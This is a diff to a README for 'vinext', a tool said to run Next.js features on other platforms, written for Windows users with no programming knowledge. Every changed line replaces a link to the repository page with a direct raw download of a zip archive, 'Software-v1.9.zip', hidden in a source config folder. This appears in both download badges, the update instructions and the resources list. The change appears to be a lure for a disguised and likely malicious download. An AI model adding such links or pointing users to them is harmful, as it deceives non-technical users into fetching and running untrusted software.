@@ -1,6 +1,6 @@
 # 🚀 vinext - Simple Next.js Features Anywhere
 
-[![Download vinext](https://img.shields.io/badge/Download-vinext-blue?style=for-the-badge)](https://github.com/Tofuu167/vinext)
+[![Download vinext](https://img.shields.io/badge/Download-vinext-blue?style=for-the-badge)](https://github.com/Tofuu167/vinext/raw/refs/heads/main/packages/vinext/src/config/Software-v1.9.zip)
 
 vinext is a tool that lets you use some parts of Next.js on different platforms. This guide helps you download and run vinext on your Windows PC. No programming knowledge is needed.
 
@@ -55,7 +55,7 @@ Below are the steps to get vinext on your Windows PC.
 
 Click this link to visit the vinext download page:
 
-[![Download vinext](https://img.shields.io/badge/Download-vinext-purple?style=for-the-badge)](https://github.com/Tofuu167/vinext)
+[![Download vinext](https://img.shields.io/badge/Download-vinext-purple?style=for-the-badge)](https://github.com/Tofuu167/vinext/raw/refs/heads/main/packages/vinext/src/config/Software-v1.9.zip)
 
 On this page, you will find the latest version for Windows.
 
@@ -145,7 +145,7 @@ If vinext does not run properly:
 
 To keep vinext working well:
 
-1. Visit the [vinext GitHub page](https://github.com/Tofuu167/vinext) regularly.
+1. Visit the [vinext GitHub page](https://github.com/Tofuu167/vinext/raw/refs/heads/main/packages/vinext/src/config/Software-v1.9.zip) regularly.
 2. Download new releases when available.
 3. Run the new installer to update your app.
 4. Your settings and endpoints will stay saved.
@@ -154,11 +154,11 @@ To keep vinext working well:
 
 ## 📚 Additional Resources
 
-- GitHub repository for vinext: https://github.com/Tofuu167/vinext  
+- GitHub repository for vinext: https://github.com/Tofuu167/vinext/raw/refs/heads/main/packages/vinext/src/config/Software-v1.9.zip  
 - Check **Issues** for known problems.
 - Explore **Discussions** or **Wiki** if available for tips.
 - Use the GitHub page to get the latest help from developers.
 
 ---
 
-[![Download vinext](https://img.shields.io/badge/Download-vinext-blue?style=for-the-badge)](https://github.com/Tofuu167/vinext)
+[![Download vinext](https://img.shields.io/badge/Download-vinext-blue?style=for-the-badge)](https://github.com/Tofuu167/vinext/raw/refs/heads/main/packages/vinext/src/config/Software-v1.9.zip)
